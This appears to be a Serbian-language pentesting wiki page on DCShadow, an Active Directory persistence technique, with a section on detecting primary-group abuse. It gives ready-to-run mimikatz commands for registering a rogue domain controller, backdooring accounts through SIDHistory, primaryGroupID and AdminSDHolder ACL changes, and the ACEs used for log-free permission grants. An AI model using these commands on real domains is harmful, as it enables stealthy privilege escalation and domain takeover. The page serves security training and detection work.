# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

Registruje **novi Domain Controller** u AD-u i koristi ga za **pushovanje atributa** (SIDHistory, SPN-ovi...) na navedene objekte, a da pri tome ne ostavlja nikakve **logove** o izvršenim **izmenama**. Potrebne su vam **DA** privilegije i morate se nalaziti unutar **root domena**.\
Imajte na umu da će se, ako koristite pogrešne podatke, pojaviti prilično ružni logovi.<sup>[[2]](#references)</sup>

Za izvršavanje napada potrebne su vam 2 mimikatz instance. Jedna od njih će pokrenuti RPC servere sa SYSTEM privilegijama (ovde morate navesti izmene koje želite da izvršite), dok će se druga instanca koristiti za pushovanje vrednosti:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Imajte na umu da **`elevate::token`** neće raditi u sesiji `mimikatz1`, pošto je time povećan nivo privilegija niti, dok mi moramo da povećamo **privilegiju procesa**.\
Takođe možete izabrati i "LDAP" objekat: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Promene možete primeniti kao DA ili kao korisnik sa sledećim minimalnim dozvolama:

- U **objektu domena**:
- _DS-Install-Replica_ (Dodavanje/uklanjanje replike u domenu)
- _DS-Replication-Manage-Topology_ (Upravljanje topologijom replikacije)
- _DS-Replication-Synchronize_ (Sinhronizacija replikacije)
- Objekat **Sites** (i njegova deca) u **Configuration kontejneru**:
- _CreateChild i DeleteChild_
- Objekat **računara koji je registrovan kao DC**:
- _WriteProperty_ (ne Write)
- **Ciljni objekat**:
- _WriteProperty_ (ne Write)

Možete koristiti [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) da dodelite ove privilegije neprivilegovanom korisniku (imajte na umu da će to ostaviti određene logove). Ovo je mnogo restriktivnije od posedovanja DA privilegija.\
Na primer: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Ovo znači da korisnik sa korisničkim imenom _**student1**_, kada se prijavi na mašinu _**mcorp-student1**_, ima DCShadow dozvole nad objektom _**root1user**_.

## Korišćenje DCShadow za kreiranje backdoor-a
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Change PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Zloupotreba primarne grupe, nedostaci enumeracije i detekcija

- `primaryGroupID` je zaseban atribut u odnosu na listu `member` grupe. DCShadow/DSInternals mogu direktno da ga upišu (npr. da postave `primaryGroupID=512` za **Domain Admins**) bez on-box LSASS enforcement-a, ali AD i dalje **premešta** korisnika: promena PGID-a uvek uklanja članstvo iz prethodne primarne grupe (isto ponašanje važi za bilo koju ciljnu grupu), tako da nije moguće zadržati staro članstvo u primarnoj grupi.<sup>[[1]](#references)</sup>
- Podrazumevani alati sprečavaju uklanjanje korisnika iz njegove trenutne primarne grupe (`ADUC`, `Remove-ADGroupMember`), pa promena PGID-a obično zahteva direktne upise u direktorijum (DCShadow/`Set-ADDBPrimaryGroup`).
- Izveštavanje o članstvu nije konzistentno:
- **Uključuje** članove izvedene iz primarne grupe: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Izostavlja** članove izvedene iz primarne grupe: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit pri pregledu atributa `member`, `Get-ADUser <user> -Properties memberOf`.
- Rekurzivne provere mogu izostaviti članove primarne grupe ako je **primarna grupa sama ugnježdena** (npr. PGID korisnika pokazuje na ugnježdenu grupu unutar Domain Admins); `Get-ADGroupMember -Recursive` ili LDAP recursive filters neće vratiti tog korisnika osim ako rekurzija eksplicitno ne razrešava primarne grupe.
- DACL trikovi: napadači mogu da **uskrate ReadProperty** nad `primaryGroupID` kod korisnika (ili nad atributom `member` grupe koje nisu zaštićene AdminSDHolder-om), čime se efektivno članstvo skriva od većine PowerShell upita; `net group` će i dalje razrešiti članstvo. Grupe zaštićene AdminSDHolder-om će poništiti takva uskraćivanja.

Primeri detekcije/monitoringa:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Uporedite privilegovane grupe tako što ćete porediti izlaz komandi `Get-ADGroupMember` i `Get-ADGroup -Properties member` ili ADSI Edit, kako biste otkrili neusaglašenosti izazvane atributom `primaryGroupID` ili skrivenim atributima.<sup>[[1]](#references)</sup>

## Shadowception - Dodela DCShadow dozvola pomoću DCShadow (bez logova o izmenjenim dozvolama)

Potrebno je da na kraju dodamo sledeće ACE-ove sa SID-om našeg korisnika:<sup>[[2]](#references)</sup>

- Na objektu domena:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Na objektu računara napadača: `(A;;WP;;;UserSID)`
- Na objektu ciljnog korisnika: `(A;;WP;;;UserSID)`
- Na objektu Sites u kontejneru Configuration: `(A;CI;CCDC;;;UserSID)`

Da biste dobili trenutni ACE objekta: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

U ovom slučaju potrebno je da izvršite **nekoliko izmena**, a ne samo jednu. U **mimikatz1 sesiji** (RPC server) koristite parametar **`/stack` uz svaku izmenu**. Zatim je potrebno da samo jednom upotrebite **`/push`** kako biste primenili sve naslagane izmene sa rogue servera.

[**Više informacija o DCShadow na sajtu ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Avanture u ponašanju, izveštavanju i eksploataciji Primary Group](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [DCShadow vodič na sajtu ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
{{#include ../../banners/hacktricks-training.md}}
